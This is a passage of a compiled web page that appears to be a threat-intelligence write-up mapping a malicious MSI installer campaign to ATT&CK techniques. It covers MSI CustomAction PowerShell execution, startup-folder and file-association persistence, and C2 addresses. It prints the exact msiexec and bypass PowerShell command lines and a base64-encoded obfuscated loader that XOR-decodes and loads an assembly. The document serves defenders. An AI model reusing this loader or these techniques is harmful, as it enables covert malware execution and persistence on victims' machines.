Msiexec")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204",(0,l.kt)("br",null),"T1218.007"),(0,l.kt)("td",{parentName:"tr",align:null},"User executed the .MSI file to launch installation, which was handled by MSIEXEC."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\msiexec.exe" /i "C:\\\\Users\\\\#{user}\\\\Desktop\\\\Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Two files were dropped. The first one is a valid Nitro Pro 13 installer, the second one is the PowerShellScriptLauncer.dll used to execute PowerShell scripts."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\MSI2C32.tmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\MSI2C33.tmp"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"MsiExec.exe executed with /V parameter (installer service process)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\msiexec.exe /V"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"MsiExec.exe is executed with -Embedding parameter (in order to execute the malicious CustomAction of the MSI file)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\MsiExec.exe -Embedding E1719003B1274EAD56C181C06EC4D717 C"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"MsiExec.exe drops different files."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\scr2C81.ps1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\msi2C71.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\pss2C93.ps1"))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"These files are dropped from the attribute CustomAction of the MSI file")),(0,l.kt)("h3",{id:"threat-actor-used-msi-custom-actions-to-launch-powershell-script-for-execution"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},".MSI")," Custom Actions to launch ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," script for Execution."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Installer executed a CustomAction to launch a malicious PowerShell inline script."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},' -NoProfile -Noninteractive -ExecutionPolicy Bypass -File "C:\\\\Users\\\\#{user}\\AppData\\\\Local\\\\Temp\\\\pss2C93.ps1" -propFile "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\msi2C71.txt" -scriptFile "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\scr2C81.ps1" -scriptArgsFile "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\scr2C82.txt" -propSep " :<->: " -testPrefix "_testValue."'))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This script is the CustomAction of the first MSI installer."),(0,l.kt)("li",{parentName:"ul"},"These files executed were dropped before for the final MSI execution id:07cd7030-ea5a-4ed1-9f40-03deffe3f587")),(0,l.kt)("h3",{id:"threat-actor-used-powershell-to-drop-lnk-files-into-windows-start-up-folder-for-persistence"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," to drop ",(0,l.kt)("em",{parentName:"h3"},".LNK")," files into Windows Start Up folder for Persistence."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1547.001",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"PowerShell dropped malicious .LNK file to Windows StartUp folder"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\miCroSoFt\\\\WINDOwS\\\\stARt MENU\\\\PRogrAMs\\\\staRtuP\\\\aad8174b5ff4d3bc9e9443812d0b0.lnK"))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"LNK files are shortcut files used by Microsoft Windows")),(0,l.kt)("h3",{id:"threat-actor-used-powershell-to-modify-file-association-in-windows-registry-for-persistence"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," to modify file association in Windows Registry for Persistence."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry"),(0,l.kt)("li",{parentName:"ul"},"T1546.001 - Event Triggered Execution: Change Default File Association"),(0,l.kt)("li",{parentName:"ul"},"T1027 - Obfuscated Files or Information"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1112",(0,l.kt)("br",null),"T1546.001",(0,l.kt)("br",null),"T1027",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"PowerShell modified default file association to execute highly obfuscated PowerShell command."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKEY_CLASSES_ROOT\\\\nnfjzceglbgu\\\\shell\\\\open\\\\command"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Full registry value encoded b64 -  UG9XRVJTaEVsbCAtV2lOZE93c3R5TGUgaGlERGVOIC1lUCBCWVBBc3MgLWNvTU1BTkQgIiRhOTBkYzYxYjg4NzRlYjk0ZjE5Njg4N2I1ZGMwMT0nWGpGcGNuNUFlMmQ1Wmo0MGZtbExibGw0YUd0clFYSitiRzVXSzI5cWVITlRRaXB4VENFeVRHeEVkbkpYZUROeVlESnpSanRhUjJzckxYY3RhMFF0YURabmZXeEhQbmhnZDBsa2FVaHlRRlpyUEQ1QWRWa21abDR4YUhCOFFHQjdVMEplVFhSRFlsNVBWWGh6UUh4RFlGZEFVeVk0ZFY1UWMySllYbTUwYlhkQWRUQTBaMEI3Y0hNd1FIeENOWDVlVVdaV0tsNXZOamxFUUg1NVozRkFVMk5KU0Y0d1kzdDMnOyRhYWNmMDhkYjVjNjQ5MWJhMDQ1NWEyYWRlY2EzMz1bU3lTdGVNLklvLkZpTEVdOjpSZWFkQUxsQllURVMoJ0M6XFVzZXJzXGFkbWluXEFwcERhdGFcUm9hbWluZ1xNSWNST3NPRlRcVUpJakJUQ3JYZlx0bkhhaWJXT0FrTklSRkdlLmlvQXNLUlBTZUZybmpYR09WYU0nKTtmT1IoJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhPTA7JGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhIC1sVCAkYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzMuQ091TnQ7KXtmb1IoJGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkPTA7JGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkIC1sVCAkYTkwZGM2MWI4ODc0ZWI5NGYxOTY4ODdiNWRjMDEubEVuZ3RoOyRhNjQyYjYzMGViYzQxM2JkM2MyZTIzZThmZDQyZCsrKXskYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzNbJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhXT0kYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzNbJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhXSAtYnhPUiAkYTkwZGM2MWI4ODc0ZWI5NGYxOTY4ODdiNWRjMDFbJGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkXTskYTA4ZmM0YjNhYjE0YjdhOGRkMGNjZWNjMWE4NmErKztpZigkYTA4ZmM0YjNhYjE0YjdhOGRkMGNjZWNjMWE4NmEgLUdFICRhYWNmMDhkYjVjNjQ5MWJhMDQ1NWEyYWRlY2EzMy5jb1VOVCl7JGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkPSRhOTBkYzYxYjg4NzRlYjk0ZjE5Njg4N2I1ZGMwMS5MRU5nVGh9fX07W3NZc3RFbS5yZUZsZUNUaW9uLkFTU0VtQkxZXTo6bG9hRCgkYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzMpO1ttYVJTLmRlSU1PU106OkluVGVyQUN0KCkiCgo="),(0,l.kt)("li",{parentName:"ul"},"randomized file extension nnfjzceglbgu"),(0,l.kt)("li",{parentName:"ul"},"this file association will cause the execution of the highly obfuscated PowerShell command when the file extension is used"),(0,l.kt)("li",{parentName:"ul"},"System.Reflection.Assembly is used for execution.")),(0,l.kt)("h3",{id:"threat-actor-used-powershell-to-drive-network-connections-to-c2-server-for-command-and-control"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," to drive network connections to C2 server for Command And Control."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"PowerShell drives network connection attempts to C2 server."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"37.120.237[.]251"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"45.42.201[.]248"))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"These connections seems to be the C2 channel established between the powershell execution and the actor"),(0,l.kt)("li",{parentName:"ul"},"IP addresses correspond to Romania")))}p.isMDXComponent=!0}}]);